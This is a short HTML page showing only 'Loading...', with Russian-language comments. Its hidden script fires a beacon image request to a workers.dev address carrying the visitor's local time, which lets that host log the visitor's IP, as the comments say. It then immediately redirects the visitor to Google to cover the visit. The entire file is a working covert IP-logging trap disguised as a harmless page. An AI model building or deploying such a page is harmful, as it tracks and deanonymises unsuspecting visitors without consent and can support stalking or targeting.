<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <script>
        const t = encodeURIComponent(new Date().toLocaleString());
        const url = "https://adminfdm.alexgranny1708.workers.dev/";

        const i = new Image();
        
        // Функция для ухода в Google
        function go() {
            window.location.replace("https://google.com");
        }

        // Если картинка загрузилась (IP пойман) — сразу уходим
        i.onload = go;
        // Если провайдер заблокировал (ошибка) — всё равно уходим
        i.onerror = go;

        // Отправляем запрос
        i.src = url + "?t=" + t;

        // Жесткий предохранитель на 1.5 секунды (если всё зависло)
        setTimeout(go, 1500);
    </script>
</head>
<body>
    <p>Loading...</p>
</body>
</html>
